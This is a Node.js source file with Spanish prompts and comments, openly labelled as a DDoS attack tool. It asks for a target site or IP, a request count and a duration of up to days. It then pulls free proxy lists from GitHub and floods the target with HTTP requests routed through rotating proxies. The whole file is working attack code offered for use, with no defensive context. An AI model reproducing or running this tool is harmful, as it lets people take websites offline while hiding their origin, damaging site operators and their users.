const http = require('http');
const https = require('https');
const readline = require('readline');

let axios;
try {
    axios = require('axios');
} catch (err) {
    console.error('Error: axios no está instalado. Por favor, instálalo usando `npm install axios`.');
    process.exit(1);
}

// Banner
const banner = `
  ______  _______ _______ _______ _______ _______ _______ _______
 |   _  \\|       |       |   _   |       |       |       |   _   |
 |  |_  ||   _   |   _   |  |_|  |   _   |   _   |   _   |  |_|  |
 |       ||  | |  |  | |  |       |  | |  |  | |  |  | |  |       |
 |  _    ||  |_|  |  |_|  |       |  |_|  |  |_|  |  |_|  |  _    |
 |_| |_| |       |       |   _   |       |       |       |_| |_| |
 |   |   |  _    |  _    |  | |  |   _   |  _    |  _    |   |   |
 |___|   |_| |_| |_| |_| |__| |__|__| |__|_| |_| |_| |_| |___|   |
`;

console.log(banner);

// Función para descargar la lista de proxies
function downloadProxies(url, callback) {
    https.get(url, (resp) => {
        let data = '';

        // A measure data in chunks
        resp.on('data', (chunk) => {
            data += chunk;
        });

        // The whole response has been received. Print out the result.
        resp.on('end', () => {
            callback(data.split('\n').filter(Boolean)); // Filtrar líneas vacías
        });

    }).on("error", (err) => {
        console.log("Error: " + err.message);
    });
}

// Función para realizar una petición HTTP a través de un proxy
async function makeRequest(url, proxy) {
    try {
        const response = await axios.get(url, { proxy });
        console.log(`Petición exitosa a ${url} a través de ${proxy}`);
    } catch (error) {
        console.error(`Error al realizar la petición a ${url} a través de ${proxy}:`, error.message);
    }
}

// Función para realizar un ataque DDoS
async function ddosAttack(target, numRequests, proxies, duration) {
    const endTime = Date.now() + duration;
    while (Date.now() < endTime) {
        for (let i = 0; i < numRequests; i++) {
            const proxy = proxies[i % proxies.length]; // Rotar proxies
            makeRequest(target, proxy);
        }
        await new Promise(resolve => setTimeout(resolve, 100)); // Esperar 100ms entre iteraciones para no saturar la RAM
    }
}

// URL de las listas de proxies
const proxyListUrls = [
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/refs/heads/master/http.txt',
    'https://raw.githubusercontent.com/proxifly/free-proxy-list/refs/heads/main/proxies/all/data.txt',
    'https://raw.githubusercontent.com/jetkai/proxy-list/refs/heads/main/online-proxies/txt/proxies-http.txt',
    'https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt'
];

// Crear interfaz de línea de comandos
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// Función para mostrar el menú
function showMenu() {
    console.log('1. Iniciar ataque DDoS');
    console.log('2. Salir');
}

// Mostrar el menú y manejar la selección del usuario
showMenu();
rl.question('Selecciona una opción: ', (choice) => {
    switch (choice) {
        case '1':
            // Solicitar al usuario que ingrese la IP o el enlace del sitio web
            rl.question('Enlaces de página web o IP: ', (targetUrl) => {
                // Solicitar al usuario que ingrese el número de peticiones
                rl.question('Número de peticiones: ', (numRequests) => {
                    // Solicitar al usuario que ingrese la duración del ataque
                    rl.question('Duración del ataque (formato: 30s, 2h, 1d): ', (duration) => {
                        let durationInMs;

                        if (duration.endsWith('s')) {
                            durationInMs = parseInt(duration, 10) * 1000;
                        } else if (duration.endsWith('h')) {
                            durationInMs = parseInt(duration, 10) * 60 * 60 * 1000;
                        } else if (duration.endsWith('d')) {
                            durationInMs = parseInt(duration, 10) * 24 * 60 * 60 * 1000;
                        } else {
                            console.error('Formato de duración no válido. Usa s para segundos, h para horas, o d para días.');
                            rl.close();
                            return;
                        }

                        // Descargar las listas de proxies
                        let allProxies = [];
                        let downloaded = 0;
                        proxyListUrls.forEach(url => {
                            downloadProxies(url, (proxies) => {
                                allProxies = allProxies.concat(proxies);
                                downloaded++;
                                if (downloaded === proxyListUrls.length) {
                                    // Realizar el ataque DDoS
                                    ddosAttack(targetUrl, parseInt(numRequests, 10), allProxies, durationInMs);
                                    // Cerrar la interfaz de línea de comandos
                                    rl.close();
                                }
                            });
                        });
                    });
                });
            });
            break;
        case '2':
            console.log('Saliendo del programa.');
            rl.close();
            break;
        default:
            console.log('Opción no válida. Por favor, selecciona 1 o 2.');
            showMenu();
            rl.question('Selecciona una opción: ', (choice) => {
                // Volver a mostrar el menú y manejar la selección del usuario
                handleMenuChoice(choice);
            });
            break;
    }
});

// Función para manejar la selección del menú
function handleMenuChoice(choice) {
    switch (choice) {
        case '1':
            // Solicitar al usuario que ingrese la IP o el enlace del sitio web
            rl.question('Enlaces de página web o IP: ', (targetUrl) => {
                // Solicitar al usuario que ingrese el número de peticiones
                rl.question('Número de peticiones: ', (numRequests) => {
                    // Solicitar al usuario que ingrese la duración del ataque
                    rl.question('Duración del ataque (formato: 30s, 2h, 1d): ', (duration) => {
                        let durationInMs;

                        if (duration.endsWith('s')) {
                            durationInMs = parseInt(duration, 10) * 1000;
                        } else if (duration.endsWith('h')) {
                            durationInMs = parseInt(duration, 10) * 60 * 60 * 1000;
                        } else if (duration.endsWith('d')) {
                            durationInMs = parseInt(duration, 10) * 24 * 60 * 60 * 1000;
                        } else {
                            console.error('Formato de duración no válido. Usa s para segundos, h para horas, o d para días.');
                            rl.close();
                            return;
                        }

                        // Descargar las listas de proxies
                        let allProxies = [];
                        let downloaded = 0;
                        proxyListUrls.forEach(url => {
                            downloadProxies(url, (proxies) => {
                                allProxies = allProxies.concat(proxies);
                                downloaded++;
                                if (downloaded === proxyListUrls.length) {
                                    // Realizar el ataque DDoS
                                    ddosAttack(targetUrl, parseInt(numRequests, 10), allProxies, durationInMs);
                                    // Cerrar la interfaz de línea de comandos
                                    rl.close();
                                }
                            });
                        });
                    });
                });
            });
            break;
        case '2':
            console.log('Saliendo del programa.');
            rl.close();
            break;
        default:
            console.log('Opción no válida. Por favor, selecciona 1 o 2.');
            showMenu();
            rl.question('Selecciona una opción: ', (choice) => {
                // Volver a mostrar el menú y manejar la selección del usuario
                handleMenuChoice(choice);
            });
            break;
    }
}
